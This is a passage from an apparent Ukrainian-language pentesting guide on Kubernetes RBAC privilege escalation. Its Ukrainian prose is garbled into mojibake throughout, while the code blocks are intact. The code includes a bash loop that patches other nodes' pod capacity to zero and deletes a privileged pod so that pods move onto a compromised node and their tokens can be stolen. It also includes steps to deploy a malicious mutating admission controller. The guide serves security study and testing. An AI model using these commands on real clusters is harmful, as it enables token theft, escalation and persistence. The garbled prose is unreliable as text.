–Ω–∞—Å—Ç—É–ø–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è).

{% hint style="warning" %}
–ü—ñ–¥ —á–∞—Å —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è –∑ –∫—ñ–Ω—Ü–µ–≤–æ—é —Ç–æ—á–∫–æ—é API K8s –±—É–¥–µ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ **—Ç–æ–∫–µ–Ω –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó GCP**. –ü–æ—Ç—ñ–º GCP, —á–µ—Ä–µ–∑ –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É API K8s, —Å–ø–æ—á–∞—Ç–∫—É **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç—å, —á–∏ –º–∞—î –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª** (–∑–∞ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—é –ø–æ—à—Ç–æ—é) **—è–∫–∏–π-–Ω–µ–±—É–¥—å –¥–æ—Å—Ç—É–ø –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞**, –ø—ñ—Å–ª—è —á–æ–≥–æ –≤—ñ–Ω –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç—å, —á–∏ –º–∞—î –≤—ñ–Ω **—è–∫–∏–π-–Ω–µ–±—É–¥—å –¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ GCP IAM**.\
–Ø–∫—â–æ **–±—É–¥—å-—è–∫–µ** –∑ —Ü—å–æ–≥–æ **–ø—Ä–∞–≤–¥–∏–≤–µ**, –≤—ñ–Ω –±—É–¥–µ **–≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏**. –Ø–∫—â–æ **–Ω—ñ**, –±—É–¥–µ –Ω–∞–¥–∞–Ω–∞ **–ø–æ–º–∏–ª–∫–∞**, —è–∫–∞ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –Ω–∞–¥–∞–Ω–Ω—è **–¥–æ–∑–≤–æ–ª—ñ–≤ —á–µ—Ä–µ–∑ GCP IAM**.
{% endhint %}

–û—Ç–∂–µ, –ø–µ—Ä—à–∏–π –º–µ—Ç–æ–¥ –ø–æ–ª—è–≥–∞—î –≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ **GCP IAM**, –¥–æ–∑–≤–æ–ª–∏ K8s –º–∞—é—Ç—å —Å–≤–æ—ó **–µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ GCP IAM**, —ñ —è–∫—â–æ —É –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞ —î —Ü—ñ –¥–æ–∑–≤–æ–ª–∏, –≤—ñ–Ω –∑–º–æ–∂–µ —ó—Ö –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

–î—Ä—É–≥–∏–π –º–µ—Ç–æ–¥ –ø–æ–ª—è–≥–∞—î –≤ **–ø—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—ñ –¥–æ–∑–≤–æ–ª—ñ–≤ K8s –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞** –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –π–æ–≥–æ **–µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—é –ø–æ—à—Ç–æ—é** (–≤–∫–ª—é—á–∞—é—á–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–± GCP).

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ —Å–ª—É–∂–±–æ–≤–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤

–ü—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏, —è–∫—ñ –º–æ–∂—É—Ç—å **—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∏ –Ω–∞ —Ç–æ–∫–µ–Ω–∏** (`serviceaccounts/token`) –ü—ñ–¥ —á–∞—Å —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è –∑ –∫—ñ–Ω—Ü–µ–≤–æ—é —Ç–æ—á–∫–æ—é API K8s SAs (—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑ [**—Ç—É—Ç**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

–ü—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏, —è–∫—ñ –º–æ–∂—É—Ç—å **`–æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏`** –∞–±–æ **`–∑–º—ñ–Ω—é–≤–∞—Ç–∏`** **`pods/ephemeralcontainers`**, –º–æ–∂—É—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –Ω–∞ —ñ–Ω—à–∏—Ö –ø—ñ–¥–∫–∞—Ö**, —ñ, –º–æ–∂–ª–∏–≤–æ, **–≤–∏–π—Ç–∏ –∑–∞ –º–µ–∂—ñ** –¥–æ —ó—Ö –≤—É–∑–ª–∞, –¥–æ–¥–∞–≤—à–∏ –µ—Ñ–µ–º–µ—Ä–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∑ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º securityContext

### ValidatingWebhookConfigurations –∞–±–æ MutatingWebhookConfigurations

–ü—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏ –∑ –±—É–¥—å-—è–∫–∏–º–∏ –¥—ñ—î—Å–ª–æ–≤–∞–º–∏ `create`, `update` –∞–±–æ `patch` –Ω–∞–¥ `validatingwebhookconfigurations` –∞–±–æ `mutatingwebhookconfigurations` –º–æ–∂—É—Ç—å **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–¥–Ω—É –∑ —Ç–∞–∫–∏—Ö webhookconfigurations**, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–µ—Å–∫–∞–ª—é–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**.

–î–ª—è –ø—Ä–∏–∫–ª–∞–¥—É [`mutatingwebhookconfigurations` –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ–π —Ä–æ–∑–¥—ñ–ª —Ü—å–æ–≥–æ –ø–æ—Å—Ç–∞](./#malicious-admission-controller).

### –ï—Å–∫–∞–ª–∞—Ü—ñ—è

–Ø–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –≤ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ: [**–ó–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω—ñ–π –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ–π –µ—Å–∫–∞–ª–∞—Ü—ñ—ó**](./#built-in-privileged-escalation-prevention), –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª –Ω–µ –º–æ–∂–µ –æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –∞–±–æ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ä–æ–ª—ñ –∞–±–æ clusterroles –±–µ–∑ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ —É –Ω—å–æ–≥–æ —Ü–∏—Ö –Ω–æ–≤–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤. –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ –≤—ñ–Ω –º–∞—î –¥—ñ—î—Å–ª–æ–≤–æ `escalate` –Ω–∞–¥ `roles` –∞–±–æ `clusterroles`.\
–¢–æ–¥—ñ –≤—ñ–Ω –º–æ–∂–µ –æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏/—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –Ω–æ–≤—ñ —Ä–æ–ª—ñ, clusterroles –∑ –∫—Ä–∞—â–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏, –Ω—ñ–∂ —Ç—ñ, —è–∫—ñ –≤ –Ω—å–æ–≥–æ —î.

### –ü—Ä–æ–∫—Å—ñ –≤—É–∑–ª—ñ–≤

–ü—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏ –∑ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ –ø—ñ–¥—Ä–µ—Å—É—Ä—Å—É **`nodes/proxy`** –º–æ–∂—É—Ç—å **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ –Ω–∞ –ø—ñ–¥–∫–∞—Ö** —á–µ—Ä–µ–∑ API Kubelet (–∑–≥—ñ–¥–Ω–æ –∑ [**—Ü–∏–º**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). –î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é Kubelet –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

–£ –≤–∞—Å —î –ø—Ä–∏–∫–ª–∞–¥ —Ç–æ–≥–æ, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ [**RCE, —Å–ø—ñ–ª–∫—É—é—á–∏—Å—å –∑ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–º –¥–æ API Kubelet —Ç—É—Ç**](../pentesting-kubernetes-services/#kubelet-rce).

### –í–∏–¥–∞–ª–µ–Ω–Ω—è –ø—ñ–¥–æ–∫ + –≤—É–∑–ª–∏, —â–æ –Ω–µ –ø—ñ–¥–ª—è–≥–∞—é—Ç—å –ø–ª–∞–Ω—É–≤–∞–Ω–Ω—é

–ü—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏, —è–∫—ñ –º–æ–∂—É—Ç—å **–≤–∏–¥–∞–ª—è—Ç–∏ –ø—ñ–¥–∫–∏** (–¥—ñ—î—Å–ª–æ–≤–æ `delete` –Ω–∞–¥ —Ä–µ—Å—É—Ä—Å–æ–º `pods`), –∞–±–æ **–≤–∏–≤–æ–¥–∏—Ç–∏ –ø—ñ–¥–∫–∏** (–¥—ñ—î—Å–ª–æ–≤–æ `create` –Ω–∞–¥ —Ä–µ—Å—É—Ä—Å–æ–º `pods/eviction`), –∞–±–æ **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ —Å—Ç–∞—Ç—É—Å –ø—ñ–¥–∫–∞** (–¥–æ—Å—Ç—É–ø –¥–æ `pods/status`) —ñ –º–æ–∂—É—Ç—å **—Ä–æ–±–∏—Ç–∏ —ñ–Ω—à—ñ –≤—É–∑–ª–∏ –Ω–µ–ø–ª–∞–Ω–æ–≤–∏–º–∏** (–¥–æ—Å—Ç—É–ø –¥–æ `nodes/status`) –∞–±–æ **–≤–∏–¥–∞–ª—è—Ç–∏ –≤—É–∑–ª–∏** (–¥—ñ—î—Å–ª–æ–≤–æ `delete` –Ω–∞–¥ —Ä–µ—Å—É—Ä—Å–æ–º `nodes`) —ñ –º–∞—é—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –ø—ñ–¥–∫–æ–º, –º–æ–∂—É—Ç—å **–≤–∏–∫—Ä–∞—Å—Ç–∏ –ø—ñ–¥–∫–∏ –∑ —ñ–Ω—à–∏—Ö –≤—É–∑–ª—ñ–≤**, —â–æ–± –≤–æ–Ω–∏ **–≤–∏–∫–æ–Ω—É–≤–∞–ª–∏—Å—è** –≤ **–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É –≤—É–∑–ª—ñ**, —ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ **–≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∏** –∑ —Ü–∏—Ö –ø—ñ–¥–æ–∫.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### –°—Ç–∞—Ç—É—Å —Å–µ—Ä–≤—ñ—Å—ñ–≤ (CVE-2020-8554)

–ü—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏, —è–∫—ñ –º–æ–∂—É—Ç—å **–∑–º—ñ–Ω—é–≤–∞—Ç–∏** **`services/status`**, –º–æ–∂—É—Ç—å –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–æ–ª–µ `status.loadBalancer.ingress.ip` –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è **–Ω–µ–≤–∏–ø—Ä–∞–≤–ª–µ–Ω–æ—é CVE-2020-8554** —Ç–∞ –∑–∞–ø—É—Å–∫—É **–∞—Ç–∞–∫ —Ç–∏–ø—É MiTM –ø—Ä–æ—Ç–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞**. –ë—ñ–ª—å—à—ñ—Å—Ç—å –∑–∞—Ö–æ–¥—ñ–≤ –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è CVE-2020-8554 –ª–∏—à–µ —É–Ω–µ–º–æ–∂–ª–∏–≤–ª—é—é—Ç—å –∑–æ–≤–Ω—ñ—à–Ω—ñ —Å–ª—É–∂–±–∏ ExternalIP (–∑–≥—ñ–¥–Ω–æ –∑ [**—Ü–∏–º**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### –°—Ç–∞—Ç—É—Å –≤—É–∑–ª—ñ–≤ —Ç–∞ –∫–∞–ø—Å—É–ª

–ü—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ **`update`** –∞–±–æ **`patch`** –Ω–∞–¥ `nodes/status` –∞–±–æ `pods/status`, –º–æ–∂—É—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –º—ñ—Ç–∫–∏ –¥–ª—è –≤–ø–ª–∏–≤—É –Ω–∞ –æ–±–º–µ–∂–µ–Ω–Ω—è –ø–ª–∞–Ω—É–≤–∞–Ω–Ω—è.

## –í–±—É–¥–æ–≤–∞–Ω–µ –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—é –ø—Ä–∏–≤—ñ–ª–µ—ó–≤

–£ Kubernetes —î [–≤–±—É–¥–æ–≤–∞–Ω–∏–π –º–µ—Ö–∞–Ω—ñ–∑–º](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—é –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

–¶—è —Å–∏—Å—Ç–µ–º–∞ –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –Ω–µ –º–æ–∂—É—Ç—å –ø—ñ–¥–≤–∏—â—É–≤–∞—Ç–∏ —Å–≤–æ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–º—ñ–Ω—é—é—á–∏ —Ä–æ–ª—ñ –∞–±–æ –∑–≤'—è–∑–∫–∏ —Ä–æ–ª–µ–π**. –ó–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–∞–≤–∏–ª–∞ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –Ω–∞ —Ä—ñ–≤–Ω—ñ API, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –∑–∞—Ö–∏—Å—Ç –Ω–∞–≤—ñ—Ç—å —É –≤–∏–ø–∞–¥–∫—É –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ–≥–æ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ç–æ—Ä–∞ RBAC.

–ü—Ä–∞–≤–∏–ª–æ –ø–µ—Ä–µ–¥–±–∞—á–∞—î, —â–æ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –∞–±–æ –æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏ —Ä–æ–ª—å –ª–∏—à–µ —É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤—ñ–Ω –º–∞—î –≤—Å—ñ –¥–æ–∑–≤–æ–ª–∏, —è–∫—ñ –≤–∫–ª—é—á–∞—î —Ü—è —Ä–æ–ª—å**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –æ–±—Å—è–≥ —ñ—Å–Ω—É—é—á–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–æ–≤–∏–Ω–µ–Ω –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –æ–±—Å—è–≥—É —Ä–æ–ª—ñ, —è–∫—É –≤—ñ–Ω –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∞–±–æ –∑–º—ñ–Ω–∏—Ç–∏: –∞–±–æ –Ω–∞ —Ä—ñ–≤–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞ –¥–ª—è ClusterRoles, –∞–±–æ –æ–±–º–µ–∂–µ–Ω–∏–π —Ç—ñ—î—é –∂ –ø—Ä–æ—Å—Ç–æ—Ä–æ–≤–æ—é –æ–±–ª–∞—Å—Ç—é (–∞–±–æ –Ω–∞ —Ä—ñ–≤–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞) –¥–ª—è Roles.

{% hint style="warning" %}
–Ñ –≤–∏–Ω—è—Ç–æ–∫ –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –ø—Ä–∞–≤–∏–ª–∞. –Ø–∫—â–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª –º–∞—î **–¥—ñ—î—Å–ª–æ–≤–æ `escalate`** –Ω–∞–¥ **`roles`** –∞–±–æ **`clusterroles`**, –≤—ñ–Ω –º–æ–∂–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó —Ä–æ–ª–µ–π —Ç–∞ –∫–ª–∞—Å—Ç–µ—Ä–Ω–∏—Ö —Ä–æ–ª–µ–π –Ω–∞–≤—ñ—Ç—å –±–µ–∑ –Ω–∞—è–≤–Ω–∏—Ö —É –Ω—å–æ–≥–æ –¥–æ–∑–≤–æ–ª—ñ–≤.
{% endhint %}

### **–û—Ç—Ä–∏–º–∞–Ω–Ω—è —Ç–∞ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**–ó–¥–∞—î—Ç—å—Å—è, —â–æ —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –ø—Ä–∞—Ü—é–≤–∞–ª–∞ —Ä–∞–Ω—ñ—à–µ, –∞–ª–µ –∑–∞ –º–æ—ó–º–∏ —Ç–µ—Å—Ç–∞–º–∏ –≤–æ–Ω–∞ –±—ñ–ª—å—à–µ –Ω–µ –ø—Ä–∞—Ü—é—î –∑ —Ç—ñ—î—ó –∂ –ø—Ä–∏—á–∏–Ω–∏, —â–æ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ. –í–∏ –Ω–µ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏/–∑–º—ñ–Ω–∏—Ç–∏ rolebinding, —â–æ–± –Ω–∞–¥–∞—Ç–∏ —Å–æ–±—ñ –∞–±–æ —ñ–Ω—à–æ–º—É SA –¥–µ—è–∫—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, —è–∫—â–æ —É –≤–∞—Å —ó—Ö –≤–∂–µ –Ω–µ–º–∞—î.**
{% endhint %}

–ü—Ä–∏–≤—ñ–ª–µ–≥—ñ—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è Rolebindings –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ **–ø—Ä–∏–≤'—è–∑—É–≤–∞—Ç–∏ —Ä–æ–ª—ñ –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏**. –¶—è –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ **–¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –ø—Ä–∏–≤'—è–∑—É–≤–∞—Ç–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–æ –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏.**

## –Ü–Ω—à—ñ –∞—Ç–∞–∫–∏

### –î–æ–¥–∞—Ç–æ–∫ –±—ñ—á–Ω–æ–≥–æ –ø—Ä–æ–∫—Å—ñ

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –º—ñ–∂ –∫–∞–ø—Å—É–ª–∞–º–∏ –Ω–µ–º–∞—î –∂–æ–¥–Ω–æ–≥–æ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è. –í–∑–∞—î–º–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è, –¥–≤–æ—Å—Ç–æ—Ä–æ–Ω–Ω—è, –≤—ñ–¥ –∫–∞–ø—Å—É–ª–∏ –¥–æ –∫–∞–ø—Å—É–ª–∏.

#### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –¥–æ–¥–∞—Ç–∫—É –±—ñ—á–Ω–æ–≥–æ –ø—Ä–æ–∫—Å—ñ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

–°—Ç–≤–æ—Ä—ñ—Ç—å —Å–≤—ñ–π .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
–í—ñ–¥—Ä–µ–¥–∞–≥—É–π—Ç–µ —Å–≤—ñ–π .yaml —Ñ–∞–π–ª —Ç–∞ –¥–æ–¥–∞–π—Ç–µ —Ä–æ–∑–∫–æ–º–µ–Ω—Ç–æ–≤–∞–Ω—ñ —Ä—è–¥–∫–∏:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –ª–æ–≥–∏ –ø—Ä–æ–∫—Å—ñ:
```bash
kubectl logs app -C proxy
```
–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### –ó–ª–æ–≤–º–∏—Å–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –ø—Ä–∏–π–æ–º—É

–ö–æ–Ω—Ç—Ä–æ–ª–µ—Ä –ø—Ä–∏–π–æ–º—É **–ø–µ—Ä–µ—Ö–æ–ø–ª—é—î –∑–∞–ø–∏—Ç–∏ –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ API Kubernetes** –ø–µ—Ä–µ–¥ –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è–º –æ–±'—î–∫—Ç–∞, –∞–ª–µ **–ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –∑–∞–ø–∏—Ç –±—É–≤ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π** **—Ç–∞ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π**.

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –≤–¥–∞—Å—Ç—å—Å—è **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –ø—Ä–∏–π–æ–º—É –º—É—Ç–∞—Ü—ñ–π**, –≤—ñ–Ω –∑–º–æ–∂–µ **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–∂–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ –∑–∞–ø–∏—Ç–∏**. –¶–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –π–æ–º—É –ø—ñ–¥–Ω—è—Ç–∏—Å—è –≤ –ø—Ä–∏–≤—ñ–ª–µ—è—Ö —Ç–∞, —è–∫ –ø—Ä–∞–≤–∏–ª–æ, –∑–∞–ª–∏—à–∏—Ç–∏—Å—è –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ.

**–ü—Ä–∏–∫–ª–∞–¥ –∑** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å—Ç–∞—Ç—É—Å, —â–æ–± –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ –≤—ñ–Ω –≥–æ—Ç–æ–≤–∏–π:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

–ü–æ—Ç—ñ–º —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–∏ –Ω–æ–≤–∏–π –∫–æ—Ç–∏–∫:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
–ö–æ–ª–∏ –≤–∏ –±–∞—á–∏—Ç–µ –ø–æ–º–∏–ª–∫—É `ErrImagePull`, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞–∑–≤—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –±—É–¥—å-—è–∫–æ–≥–æ –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
